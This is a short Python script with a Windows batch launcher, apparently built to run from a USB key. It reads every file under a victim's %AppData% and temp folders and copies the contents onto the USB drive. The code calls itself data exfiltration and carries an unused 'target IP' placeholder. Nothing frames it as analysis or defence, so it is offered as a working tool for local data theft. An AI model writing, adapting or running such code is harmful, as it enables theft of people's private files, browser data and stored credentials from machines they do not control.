import os
import base64

def collect_and_exfiltrate_data(target_ip):
    try:
        # Specify the directories to collect data from
        directories_to_collect = [os.path.expandvars("%AppData%"), os.path.expandvars("%temp%")]

        # Collect data from specified directories
        collected_data = ""
        for directory in directories_to_collect:
            for root, _, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    with open(file_path, "rb") as f:
                        file_content = f.read()
                        collected_data += f"\n\nFile: {file_path}\n\n{file_content.decode(errors='ignore')}"

        # Save the collected data to a file on the USB key
        usb_drive = os.path.dirname(os.path.abspath(__file__))
        output_file_path = os.path.join(usb_drive, "CollectedData", "CollectedData.txt")
        with open(output_file_path, "w", encoding="utf-8") as output_file:
            output_file.write(collected_data)

        print(f"Data collected and saved to {output_file_path}")

    except Exception as e:
        print(f"Error during data collection and saving: {e}")

# Run the data collection and exfiltration when the script is executed
target_ip = "192.168.1.1"  # Replace with your target's IP address
collect_and_exfiltrate_data(target_ip)




@echo off
set USB_DRIVE=%~d0

:: Create a directory on the USB key to store collected data
mkdir %USB_DRIVE%\CollectedData

:: Run the Python script to collect and exfiltrate data
python %USB_DRIVE%\YourScript.py

:: Prompt the user to press any key to exit (optional)
pause
